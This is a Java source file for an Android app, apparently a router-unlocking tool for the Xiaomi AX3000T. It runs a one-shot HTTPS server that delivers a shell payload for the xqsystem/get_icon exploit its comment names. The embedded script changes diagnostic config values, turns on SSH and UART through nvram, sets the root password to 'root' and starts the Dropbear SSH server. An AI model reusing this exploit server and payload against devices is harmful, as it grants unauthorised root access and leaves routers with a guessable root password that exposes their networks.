package com.minis.ax3000t;

import android.content.Context;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyStore;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import javax.net.ServerSocketFactory;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLServerSocket;

/**
 * One-shot HTTPS server required by the documented xqsystem/get_icon exploit.
 * It serves only the fixed diagnostic payload and accepts one request.
 */
public final class PayloadServer implements AutoCloseable {
    public static final String PAYLOAD_PATH = "/etc/diag_info/stat/firewall/payload.sh";
    private static final String KEYSTORE_PASSWORD = "ax3000t";

    private final Context context;
    private final int port;
    private final CountDownLatch requestSeen = new CountDownLatch(1);
    private volatile boolean closed;
    private volatile ServerSocket serverSocket;
    private Thread thread;

    public PayloadServer(Context context, int port) {
        this.context = context.getApplicationContext();
        this.port = port;
    }

    public void start() throws Exception {
        KeyStore keyStore = KeyStore.getInstance("PKCS12");
        try (InputStream input = context.getAssets().open("payload/server.p12")) {
            keyStore.load(input, KEYSTORE_PASSWORD.toCharArray());
        }
        KeyManagerFactory keyManagers = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
        keyManagers.init(keyStore, KEYSTORE_PASSWORD.toCharArray());
        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(keyManagers.getKeyManagers(), null, null);
        ServerSocketFactory factory = sslContext.getServerSocketFactory();
        SSLServerSocket socket = (SSLServerSocket) factory.createServerSocket(port, 1, (InetAddress) null);
        socket.setNeedClientAuth(false);
        serverSocket = socket;
        thread = new Thread(this::serveOnce, "ax3000t-payload-server");
        thread.start();
    }

    private void serveOnce() {
        try (ServerSocket ignored = serverSocket) {
            Socket socket = serverSocket.accept();
            try (Socket client = socket) {
                client.setSoTimeout(8000);
                InputStream input = client.getInputStream();
                readHeaders(input);
                requestSeen.countDown();
                byte[] body = payload().getBytes(java.nio.charset.StandardCharsets.UTF_8);
                OutputStream output = client.getOutputStream();
                output.write(("HTTP/1.1 200 OK\r\n"
                        + "Content-Type: application/octet-stream\r\n"
                        + "Content-Length: " + body.length + "\r\n"
                        + "Connection: close\r\n\r\n").getBytes(java.nio.charset.StandardCharsets.US_ASCII));
                output.write(body);
                output.flush();
            }
        } catch (Exception ignored) {
            // The caller reports timeout/failure; do not leak a worker exception.
        } finally {
            requestSeen.countDown();
        }
    }

    public boolean awaitRequest(long timeoutMs) throws InterruptedException {
        return requestSeen.await(timeoutMs, TimeUnit.MILLISECONDS);
    }

    private static void readHeaders(InputStream input) throws Exception {
        ByteArrayOutputStream headers = new ByteArrayOutputStream();
        int previous = -1;
        int current;
        while ((current = input.read()) != -1) {
            headers.write(current);
            if (previous == '\r' && current == '\n') {
                byte[] data = headers.toByteArray();
                int length = data.length;
                if (length >= 4 && data[length - 4] == '\r' && data[length - 3] == '\n'
                        && data[length - 2] == '\r' && data[length - 1] == '\n') {
                    return;
                }
            }
            previous = current;
            if (headers.size() > 32 * 1024) throw new IllegalArgumentException("HTTP header too large");
        }
    }

    private static String payload() {
        // This is intentionally limited to enabling stock Dropbear and does not
        // touch NAND or flash. The trigger values mirror the upstream exploit.
        return "#!/bin/sh\n"
                + "FUNC_NUM=$(uci -q get diag.config.iperf_test_thr)\n"
                + "if [ \"$FUNC_NUM\" = \"990000\" ]; then\n"
                + "  uci set diag.config.iperf_test_thr=800008; uci commit diag\n"
                + "fi\n"
                + "if [ \"$FUNC_NUM\" = \"990001\" ]; then\n"
                + "  uci set diag.config.iperf_test_thr=22; uci commit diag\n"
                + "  sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear\n"
                + "  nvram set ssh_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit\n"
                + "  printf 'root\\nroot\\n' > /tmp/psw.txt; passwd root < /tmp/psw.txt\n"
                + "  /etc/init.d/dropbear enable\n"
                + "fi\n"
                + "if [ \"$FUNC_NUM\" = \"990002\" ]; then\n"
                + "  uci set diag.config.iperf_test_thr=22; uci commit diag\n"
                + "  /etc/init.d/dropbear restart\n"
                + "fi\n"
                + "if [ \"$FUNC_NUM\" = \"990003\" ]; then\n"
                + "  nvram set uart_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit\n"
                + "fi\n";
    }

    @Override
    public void close() {
        closed = true;
        ServerSocket socket = serverSocket;
        if (socket != null && !socket.isClosed()) {
            try {
                socket.close();
            } catch (Exception ignored) {
            }
        }
        if (thread != null) thread.interrupt();
    }
}
